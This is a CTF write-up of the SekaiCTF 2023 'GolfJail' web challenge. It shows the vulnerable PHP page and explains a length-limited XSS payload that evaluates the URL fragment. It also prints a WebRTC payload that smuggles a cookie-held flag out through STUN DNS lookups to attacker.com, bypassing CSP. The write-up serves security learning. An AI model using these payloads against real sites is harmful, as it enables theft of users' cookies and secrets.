## GolfJail (16 solves) -- [strellic](https://twitter.com/Strellic_)
#### `CSP Bypass` and `XSS`

In this challenge, the source code to analyze is really small. 
Although, as solves illustrates, is a hard challenge.

#### Code Analysis

```php
<?php
    header("Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';");
    header("Cross-Origin-Opener-Policy: same-origin");

    $payload = "🚩🚩🚩";
    if (isset($_GET["xss"]) && is_string($_GET["xss"]) && strlen($_GET["xss"]) <= 30) {
        $payload = $_GET["xss"];
    }

    $flag = "SEKAI{test_flag}";
    if (isset($_COOKIE["flag"]) && is_string($_COOKIE["flag"])) {
        $flag = $_COOKIE["flag"];
    }
?>
<!DOCTYPE html>
<html>
    <body>
        <iframe
            sandbox="allow-scripts"
            srcdoc="<!-- <?php echo htmlspecialchars($flag) ?> --><div><?php echo htmlspecialchars($payload); ?></div>"
        ></iframe>
    </body>
</html>
```

#### Chall Solution 

The solution comprises three distinct pieces of knowledge that we need to possess beforehand.

- Iframe `srcdoc` allow HTML Entities.
- `WebRTC` to bypass Content-Security-Policy (`CSP`) ([github open issue](https://github.com/w3c/webappsec-csp/issues/92)).
- Techniques for creating a tiny payload (length<30 restriction).

Basically, the final solution involves deploying a tiny payload that executes fragments of the URL (`http://example.com/?xss=payload#fragment`) where we inserted our payload. This technique enables us to bypass the length restriction. Subsequently, we can employ WebRTC to exfiltrate the flag.

The payload to execute the fragment of the url is: `<svg/onload=eval(`'`+baseURI)>`. `baseURI` will return the full url, and implicitly calls `document.baseURI`. In order to have a valid JS code we need to convert the url to a valid code. For doing the that, the easiest way is to wrap the url as a string. So if we add the `'` before the `baseURI` and in the fragment we do something similar to `#';PAYLOAD`, the url will be wrapped. To sum up, our payload will look like: `http://vuln.webpage/?xss=<svg/onload=eval(`'`+baseURI)>#';console.log("EXECUTED!");`.  

Now, that we can execute code, we need to create a WebRTC connection to exfiltrate the flag. In this final part, there was a tricky part for special characters in the DNS request. The final payload from [Antonius writeup](https://blog.antoniusblock.net/posts/golfjail/) for the WebRTC connection was: `pc=new RTCPeerConnection({"iceServers":[{"urls":["stun:"+document.firstChild.data.substring(7,document.firstChild.data.length-2).split("").map(x=>x.charCodeAt(0).toString(16)).join("").substr(0,62)+"."+"attacker.com"]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
`.

#### Writeups:
- [Official 'writeup'](https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/golf-jail/solution/solve.txt).
- [Antonius writeup](https://blog.antoniusblock.net/posts/golfjail/).
- [Maitai's writeup](https://leonsirio.github.io/2023/08/29/sekai23-golf-jail.html).
